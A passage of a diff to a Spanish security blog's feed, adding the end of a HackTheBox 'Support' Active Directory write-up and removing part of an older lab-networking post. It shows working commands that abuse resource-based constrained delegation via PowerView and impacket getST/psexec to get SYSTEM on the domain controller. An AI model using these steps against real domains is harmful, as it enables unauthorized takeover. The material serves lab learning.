+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$SDBytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object byte[] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SD&lt;/span&gt;.BinaryLength&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$SD&lt;/span&gt;.GetBinaryForm&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SDBytes&lt;/span&gt;, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-DomainComputer dc | Set-DomainObject &lt;span class=&quot;nt&quot;&gt;-Set&lt;/span&gt; @&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'msds-allowedtoactonbehalfofotheridentity'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SDBytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-DomainComputer dc &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'msds-allowedtoactonbehalfofotheridentity'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msds-allowedtoactonbehalfofotheridentity
+&lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1, 0, 4, 128...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;granted-access-administrator-user-golden-ticket&quot;&gt;GRANTED ACCESS ADMINISTRATOR USER (GOLDEN TICKET)&lt;/h2&gt;
+
+&lt;p&gt;Vamos a hacer uso de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getST&lt;/code&gt; con la que obtendremos un golden ticket del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; aprovechando la creación de la cuenta de máquina realizada en pasos anteriores, obteniendo acceso con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-getST &lt;span class=&quot;nt&quot;&gt;-spn&lt;/span&gt; cifs/dc.support.htb &lt;span class=&quot;nt&quot;&gt;-impersonate&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.11.174 support.htb/SERVICEA&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;password123
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Impersonating Administrator
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 	Requesting S4U2self
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 	Requesting S4U2Proxy
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Saving ticket &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Administrator.ccache
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Administrator.ccache
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; dc.support.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;flags&quot;&gt;FLAGS&lt;/h2&gt;
+
+&lt;p&gt;Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type&lt;/code&gt;, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:/
+&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /b/s user.txt
+c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;upport&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
+&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;upport&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ser.txt&quot;&lt;/span&gt;
+echo.%user:~0,10%
+ce03e32c55
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:/
+&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /b/s root.txt
+c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
+&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ser.txt&quot;&lt;/span&gt;
+echo.%root:~0,10%
+4e4ed829c0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/11-virtual.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/support/07-finish.png&quot; /&gt;
 &lt;/p&gt;
-
-&lt;h2 id=&quot;validación-de-conexiones&quot;&gt;VALIDACIÓN DE CONEXIONES&lt;/h2&gt;
-
-&lt;p&gt;Ya tenemos el entorno configurado, ahora vamos a validar si nuestras máquinas tienen la configuración de red correcta.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/12-virtual.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Como podemos ver, la primera máquina tiene una dirección asociada a la primera red únicamente, la segunda máquina tiene esta misma red y adicionalmente la red nueva creada a través de la interfaz, por último, la tercera máquina se encuentra asociada a la segunda red interna, también generada por la nueva interfaz.&lt;/p&gt;
-
-&lt;h2 id=&quot;prueba-de-conectividad&quot;&gt;PRUEBA DE CONECTIVIDAD&lt;/h2&gt;
-
-&lt;p&gt;Nuestra configuración ha sido exitosa, tenemos que hacer pruebas de conectividad para corroborar que nuestras redes sean operativas, debemos tener en cuenta lo siguiente:&lt;/p&gt;
-&lt;blockquote&gt;
-
-  &lt;ul&gt;
-    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 1&lt;/code&gt; solo puede tener conectividad por el mismo segmento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt; tiene conectividad por el mismo segmento de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquinas 1 y 2&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 3&lt;/code&gt; solo puede tener conectividad por el mismo segmento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt;&lt;/li&gt;
-  &lt;/ul&gt;
-
-&lt;/blockquote&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/13-virtual.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Con esta configuración vamos a tener la posibilidad de crear nuevos entornos para practicar nuestros ejercicios de hacking orientados al pivoting, tema bastante importante para certificaciones como la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eCPPT&lt;/code&gt;, crear laboratorios propios nos da una ventaja en no depender de otras infraestructuras para practicar, así que esperen una corta serie pero de mucho aprendizaje en los próximos posts.&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Python" /><category term="Script" /><summary type="html">Vamos a conocer la utilidad SafeWebHeaders.py creada por The Game 008 para auditar cabeceras web. ¡Let's hack!</summary></entry><entry><title type="html">HTB forest AD</title><link href="http://localhost:4000/forest/" rel="alternate" type="text/html" title="HTB forest AD" /><published>2023-03-01T00:00:00-05:00</published><updated>2023-03-01T00:00:00-05:00</updated><id>http://localhost:4000/forest</id><content type="html" xml:base="http://localhost:4000/forest/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Support" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina support AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB forest AD</title><link href="http://localhost:4000/forest/" rel="alternate" type="text/html" title="HTB forest AD" /><published>2023-03-01T00:00:00-05:00</published><updated>2023-03-01T00:00:00-05:00</updated><id>http://localhost:4000/forest</id><content type="html" xml:base="http://localhost:4000/forest/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/forest/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
